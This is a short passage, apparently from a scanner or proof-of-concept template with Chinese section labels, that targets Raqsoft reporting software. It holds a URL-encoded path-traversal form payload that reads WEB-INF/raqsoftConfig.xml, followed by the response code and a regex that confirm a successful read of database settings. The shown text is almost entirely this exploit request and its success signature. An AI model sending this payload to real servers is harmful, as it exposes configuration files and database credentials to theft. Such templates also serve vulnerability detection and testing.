    Content-Type: application/x-www-form-urlencoded


    Connection: close


    file=%2F%5C..%5C%5C..%5C%5CWEB-INF%5C%5CraqsoftConfig.xml&upFileName=web.config


    # 响应代码特征

    200


    # 响应内容特征

    ^(?=.*?DB)(?=.*?name).*?$


    # 上传文件定位

